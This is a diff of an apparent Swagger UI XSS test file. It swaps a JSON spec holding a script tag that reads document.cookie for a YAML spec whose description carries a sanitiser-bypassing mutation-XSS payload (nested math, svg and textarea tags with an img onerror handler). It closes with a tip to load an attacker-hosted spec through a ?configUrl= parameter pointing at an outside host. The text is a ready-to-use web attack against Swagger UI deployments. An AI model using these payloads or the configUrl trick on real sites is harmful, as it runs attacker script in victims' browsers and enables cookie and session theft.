@@ -1,20 +1,19 @@
-{
-  "swagger": "2.0",
-  "info": {
-    "title": "XSS Test",
-    "version": "1.0"
-  },
-  "paths": {
-    "/xss": {
-      "get": {
-        "summary": "XSS Test",
-        "description": "<script>alert(document.cookie)</script>",
-        "responses": {
-          "200": {
-            "description": "Success"
-          }
-        }
-      }
-    }
-  }
-}
+swagger: '2.0'
+info:
+  title: Example yaml.spec
+  description: |
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+If you are lazy
+You can use just add this parameter to the URL of Swagger and see if it pops an alert:
+
+?configUrl=https://jumpy-floor.surge.sh/test.json
